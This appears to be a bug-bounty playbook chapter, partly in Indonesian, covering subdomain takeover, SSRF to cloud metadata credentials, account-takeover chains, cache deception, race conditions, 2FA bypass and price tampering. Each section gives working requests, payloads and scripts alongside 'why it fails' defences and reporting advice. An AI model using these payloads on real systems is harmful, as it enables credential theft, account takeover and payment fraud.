# bb-classes — bb

# Reference Chapter: Bug Class "Payout-to-Effort 2026"

Triage priority table (low–high payout calibration vs work hours):

| Class | Example target | Effort (hours) | Typical payout | $/hour ratio | Notes |
|---|---|---|---|---|---|
| Subdomain takeover | SaaS CNAME → herokuapp, azurewebsites | 1–4 | $200–$2.500 | Tinggi | Hidupkan PoC dulu |
| SSRF metadata | AWS IMDSv1, GCP v1beta1 | 2–8 | $500–$5.000 | Tinggi | IMDSv2 = no-go |
| Race limit overrun | coupon, withdraw, follow | 4–12 | $300–$3,000 | Medium–high | Requires Turbo Intruder http2 single-packet |
| ATO chain | OAuth + email change + logout | 6–20 | $1,000–$8,000 | Medium | Chain-heavy, requires video |
| 2FA bypass | OTP brute, response tamper | 2–6 | $500–$4.000 | Tinggi | Rate-limit angle |
| Web cache deception | SaaS profile/premium path | 3–8 | $400–$3,000 | Medium | Depends on CDN |
| Business logic price/qty | checkout qty=-1, price decimal | 2–6 | $200–$2,500 | Low–medium | Often rejected as "by design" |
| TOCTOU payment/coupon | redeem → refund | 4–10 | $500–$3,000 | Medium | Requires observability |

---

## 1. Subdomain Takeover Flow

What is sent:
```
dig +short CNAME dev.target.com
dig +short A dev.target.com
curl -sI https://dev.target.com | head
```

What appears (takeable indicators):
| Provider | Body / header khas | Status takeover |
|---|---|---|
| Heroku | `No such app` | Ya |
| Azure App Service | `404 Web Site not found` + `x-msedge-ref` | Ya (slot/app deleted) |
| GitHub Pages | `There isn't a GitHub Pages site here` | Ya |
| Shopify | `Sorry, this shop is currently unavailable` | Ya |
| Netlify | `Not Found - Request ID` | Ya |
| CloudFront | `Bad request` + `x-cache` | Kadang (distribution ada) |
| Fastly | `Fastly error: unknown domain` | Ya |
| AWS S3 website | `NoSuchBucket` | Ya |
| Zendesk | `Help Center Closed` | Ya |
| Statuspage | `You are being redirected` + no page | Ya |
| WordPress.com | `Do you want to register` | Ya |

Why it works: DNS still points to the provider; the resource has been deleted but not cleaned up. Why it fails: providers now bind `custom domain` to an account before serving content (Heroku post-2021 for active apps, Vercel 2023+ TXT verification) — a dangling `CNAME` without takeover is just info, not a vuln.

Verification payload (Heroku):
```
heroku create pwned-$RANDOM
heroku domains:add dev.target.com
# lalu curl bukti origin
```

Report angle: include DNS screenshot + provider "No such app" page **before** claiming, live pwned URL, and concrete impact scenario (cookie scope `.target.com`, phishing on official subdomain, CORS `*.target.com`).

---

## 2. ATO Chain (email change → session invalidation gap)

Common chains still alive in 2026:
1. Register an account with email A (attacker).
2. Swap email to victim B via the `POST /api/account/email` endpoint that does **not** verify that the current email is verified/owned.
3. Reset password → OTP sent to B.
4. Click the reset link from the attacker's inbox (since the attacker hasn't actually lost control) — variation: OTP stored in Redis with key `reset:{uid}` without TTL → replay after the victim resets.

What is sent:
```
POST /api/v1/account/email HTTP/2
Host: target.com
Content-Type: application/json
Cookie: _session=<A>

{"new_email":"attacker+1@evil.com","current_password":"<A>"}
```
What appears: `200 {"ok":true}` without a new email verification step → continue `POST /api/v1/password/forgot {"email":"attacker+1@evil.com"}`. Because the victim's session is not invalidated (`session_version` is not bumped), the attacker holds session A and the victim loses access.

Common 2026 failure: IdP sync — if the target uses Okta/Auth0, `email` is immutable after verification; the chain breaks at step 2.

Report angle: video ≤60s, request timeline, impact "account cannot be recovered by the victim" (permanent ATO) — its value differs from temporary ATO.

---

## 3. SSRF Metadata

What is sent (IMDSv1, AWS):
```
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com
```
What appears: `200 {"role":"ec2-role-xyz"}` → continue to `.../security-credentials/ec2-role-xyz` → JSON `{AccessKeyId, SecretAccessKey, Token, Expiration}`.

GCP (metadata v1beta1, still present on legacy VMs + some Cloud Run):
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```
Header not required in v1beta1; v1 (`Metadata-Flavor: Google`) = patched.
Azure:
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

Why it works: weak allowlist regex (`^https?://[^\s]+$`), redirect follow without post-DNS hop validation, DNS rebinding (`attacker.com` → `169.254.169.254` TTL 0). Why it fails: metadata egress proxy `169.254.0.0/16` is denied at the network layer (standard in EKS 1.28+ with IMDS hop limit = 1).

Payload redirect/rebinding:
```python
# 302 chain
@app.route("/r")
def r(): return redirect("http://169.254.169.254/latest/meta-data/", 302)
# DNS rebinding: toggle A record antara 1.2.3.4 dan 169.254.169.254 per query
```

Report angle: **do not** exfiltrate full credentials; just the `AccessKeyId` prefix + `Expiration` redacted. A report without AWS impact (`aws sts get-caller-identity` forbidden) = often downgraded to informational.

---

## 4. Web Cache Deception in SaaS

What is sent:
```
curl -s -H "Cookie: session=<victim>" \
  "https://app.target.com/api/me/settings/foo.css" | grep email
```
What appears: profile HTML (not 404) with `Cache-Control: public` from the upstream CDN → an attacker without cookies requesting the same path yields the victim's data.

Fragile configurations targeted:
| Stack | Signature vuln |
|---|---|
| nginx 1.25 `try_files $uri $uri/ /index.html` | `*.css`, `*.jpg` fallback to SPA shell |
| Cloudflare 2024+ cache rule `ends_with .css/.js` | `?` variant and `;.css` (matrix param) |
| Fastly VCL `lookup` without `req.http.Cookie` guard | Set-Cookie does not block cache |
| Varnish 7 `default.vcl` with `return(lookup)` before `beresp.ttl=0` | If the backend returns 200 for any extension path |

Payload varian delimiter:
```
/profile;.css
/profile%3B.css
/profile.json.css
/profile/.css
/profile%00.css        # nginx 1.25 → 400, biasanya gagal
/profile..;css         # kadang LOLos di CDN lama
```

Why it fails in 2026: most popular CDNs (Cloudflare Cache Rules GA, Fastly 2024) now punt `Set-Cookie` + `Vary: Cookie` on SPA origin responses; the `__cf_bm` cookie also forces a miss.

Report angle: include two requests (victim then attacker) with `Age`/`CF-Cache-Status: HIT` on the second request; concrete impact = CSRF token, email, plan tier.

---

## 5. Race Condition

### 5a. Limit overrun (follow, like, redeem)
What is sent — Turbo Intruder, HTTP/2 single-packet attack (gate 20–30 requests):
```
POST /api/follow/123 HTTP/2
X-Forwarded-For: <rotating>
Cookie: session=<A>
```
Core script (Turbo Intruder 2024+, `race-single-packet-attack.py`):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           engine=Engine.HTTP2, requestsPerConnection=100, pipeline=False)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status: table.add(req)
```
What appears: N× `200 {"following":true}` for N requests → `followers_count` = 30 from a single account. Why it works: reads `SELECT count` then `INSERT` without `UNIQUE(user_id, target_id)`; DB default `READ COMMITTED`. Why it fails: PostgreSQL `SERIALIZABLE` or `INSERT ... ON CONFLICT DO NOTHING` + advisory lock → only 1 succeeds.

### 5b. TOCTOU payment/coupon
```
POST /api/cart/redeem  {"coupon":"WELCOME10","order_id":"A"}
POST /api/cart/checkout {"order_id":"A"}
# gate keduanya pada satu paket; varian: redeem ke dua order_id di paket sama
```
What appears: two orders get the discount, or one coupon `usage_count` = 1 but two orders `status=paid`. Check with `GET /api/orders/A` vs `/B` comparing `subtotal`.

Why it fails: Stripe 2024+ `Idempotency-Key` at checkout, `SELECT ... FOR UPDATE` on the coupon row, Redis `SETNX coupon:{id}`.

Report angle: 1-shot video with Turbo Intruder log, show the balance/`usage_count` delta before-after. A race without state delta proof = zero.

---

## 6. 2FA Bypass

Payload arsenal 2026:

| Vector | Send | Appears | Fails because |
|---|---|---|---|
| OTP brute without rate-limit | `POST /2fa/verify {"code": 000000..999999}` | `200` on valid code | Cloudflare rate limit 5/min |
| OTP reuse | verify → logout → verify code sama | `200` | code is set to `consumed_at` |
| Response tamper (client-side) | `200` → change body to `{"mfa":"ok"}` at the proxy | dashboard load | backend checks session `mfa_passed` |
| Backup code array | kirim array `["",""]` / `null` | `200` | strict type validation |
| Dua window | request verify paralel (race) | 2 sesi lolos | session store atomic |
| Bypass via IdP | login Google SSO + `?mfa=skip` | session without TOTP | flag only at IdP, gateway re-check |
| Step-skip state machine | `POST /register/step3` without step2 | `200 dashboard` | server-side step check |

Example tamper:
```
POST /api/2fa/verify HTTP/2
{"code":"123456","action":"disable"}
```
Then directly `POST /api/2fa/disable` without verify — many bugs: disable endpoint calls `verify` only from the client-side.

Why 2026 fails: FIDO2/passkey is the default at Google/Okta since 2023 — OTP fallback is often disabled, narrowing the target.

---

## 7. Business Logic Price / Quantity

Payload klasik:
```
{"qty":-1,"price":100}            # refund sisi attacker
{"qty":0.0001,"price":"-1"}       # float + string
{"price":1e-9}                    # exponent
{"qty":"1e2","price":"0"}
{"price":100.999}                 # trunc vs round
{"price":{"$gt":0}}               # NoSQL operator injection di cart
```
What appears: `subtotal: -100`, `total: 0`, or Stripe `payment_intent` for 1¢ even though the item is $99.

| Bug | Send | Appears | Fails because |
|---|---|---|---|
| Negative qty → credit | `qty:-1` | subtotal negatif | validator integer `>0` |
| Price override | `price: 1` | checkout 1 IDR | price from server-side lookup |
| Decimal trunc | `price: 0.009` | 0.00 | round half-up |
| Coupon stack | `coupon[]=A&coupon[]=B` | total 0 | single coupon field |
| Currency swap | `currency: "IDR"` saat checkout | harga 100× murah | allowlist currency per plan |
| Tax bypass | `country: "ZZ"` | pajak 0 | GeoIP server-side |

Why 2026 fails: Stripe Payment Intent + Price object (not ad-hoc `amount`), backend 3DS re-validates total. Many SaaS targets use Stripe Billing `checkout.sessions.create` with server-derived `line_items` — custom price endpoints are rare.

Angle report: do not claim "free money" — show **state** (paid order, invoice paid, `payment_intent.succeeded`) not just a 200 response. Include quantitative loss per unit.

---

## 8. Discovery Playbook

| Kelas | Query / tool | Signature |
|---|---|---|
| Subdomain takeover | `subfinder -d target.com -silent \| dnsx -cname -resp` → `httpx -status-code -title -tech-detect` | halaman provider "no such app" |
| SSRF | crawling param URL: `ffuf -w params.txt -u https://t/{{}}?url=FUZZ -mr "169.254\|metadata"` | response metadata |
| WCD | `ffuf` path `/profileFUZZ` FUZZ=`;.css,.css,..;.css,/.css,%3B.css` | 200 + `CF-Cache-Status: HIT` |
| Race | `Turbo-Intruder` single-packet, `gate=` | N 200 identik |
| 2FA | Burp auth flow capture → compare `mfa_token` JWT claim vs session | claim `amr:["pwd"]` tapi dashboard |
| Bizlogic | Burp `Param Miner` header `X-Forwarded-*`, `?test=1`, integer boundary `0,-1,1e309` | total/quantity anomali |
| ATO | diff login flow email vs oauth flow session_version | no session invalidation |

Shell one-liner takeover sweep:
```bash
subfinder -d target.com -silent | dnsx -silent -cname -resp \
| awk '{print $1, $3}' | while read h c; do
    case "$c" in
      *herokuapp*|*azurewebsites*|*github.io*|*netlify*|*cloudfront*|*fastly*)
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://$h")
        echo "$h -> $c [$code]";;
    esac
done
```

---

## 9. Angle Report (Spesifisitas Klaim)

| Class | Strong title | Minimum evidence | Avoid |
|---|---|---|---|
| Subdomain takeover | "Takeover subdomain `dev.` via dangling Heroku CNAME allows cookie theft of `.target.com`" | DNS + pwned live + Set-Cookie screenshot | claim without a live host |
| SSRF | "SSRF IMDSv1 to `ec2-role` — access S3 bucket `prod-uploads`" | redacted key prefix + ARN role | dump full credentials |
| WCD | "Cache deception in `/settings` via `.css` — exfil email & CSRF token across users" | victim + attacker request, `Age>0` | `%00` path |
| Race | "Single-packet race on `/redeem` results in 12x coupon usage → loss of Rp X" | log gate + delta `usage_count` | serial retry (not race) |
| 2FA | "Bypass 2FA via response tamper on endpoint `verify` for mobile version 5.12" | raw request + session without `amr=otp` | test only on your own account → engineering needs a victim sim |
| Bizlogic | "Negative quantity at checkout triggers credit balance (order #123 balance +$99)" | invoice + order screenshot | "can send price 0" without an order |
| ATO | "Permanent ATO: email change without re-auth + `session_version` not bumped" | timeline + video of locked victim | ATO cannot be recovered |

Notification rules: for SSRF/AWS, only API key prefix. For ATO, do not open victim's account for more than 1 minute. For race, document `request_time` delta <5ms.

---

## 10. Operational Traps (techniques that are truly fatal)

- **Purge cache / TTL**: WCD PoC HIT only if `Age` > 0 on the **second** request. On Cloudflare Free, TTL is 0 for dynamic HTML — check origin `cache-control` first.
- **Header `Vary: Cookie`**: destructive on modern CDNs — WCD often fails not because of the origin.
- **TLS / HSTS preload on subdomain**: takeover successful in DNS but `chrome 131` preload list rejects self-signed cert → PoC must use a valid cert from the takeover provider.
- **IMDSv2 default**: AWS instances 2023+ have `HttpTokens=required`. SSRF to `169.254.169.254` returns `401` — not a vulnerability. Check consistency of `/latest/api/token`.
- **Egress proxy**: metadata IP is denied in VPC/EKS 1.28+ (default `IMDS hop limit = 1`), SSRF to DNS rebinding still hits `169.254.0.0/16` deny.
- **Turbo Intruder HTTP/2**: nginx server < 1.25 without high `http2_max_concurrent_streams` → non-deterministic race results. Retry 3x before reporting.
- **Race on database read replica**: replication lag of 100–500ms creates a race illusion. Test on the same read-write endpoint, not the GET endpoint.
- **Idempotency-Key** in Stripe/shopify checkout kills TOCTOU coupons — check the header in the first checkout request.
- **Passkey replacing OTP**: targets that have migrated to FIDO2 do not have the `/2fa/verify` endpoint at all → do not send payload to dead endpoints.
- **Cloudflare Turnstile / rate-limit**: brute 6-digit OTP (1e6) requires a 500ms gate; without `X-Forwarded-For` rotation → 429 at ~20 requests, vulnerability claim fails.
- **Subdomain takeover post-invalidation**: Heroku 2021+ requires TXT verification; Azure `App Service` slot deleted sometimes CNAME resolves to `404` but domain registration requires another Azure tenant account — takeover is only possible if the `azurewebsites.net` app is truly deleted (not a slot swap).
- **SSRF without egress**: connection from Cloudflare Workers → `169.254.169.254` is definitely blocked; SSRF is only at the origin VM, not the edge.
- **Bizlogic "by design"**: negative qty that returns credit balance is often stated as a feature — prepare a demo of a paid order (not just a cart) and cumulative loss figures.
- **Legal scope**: race attacks on other people's accounts in prod = out of scope unless permitted by the program; test single-account first, document intent.

---

## [reasoning trace]


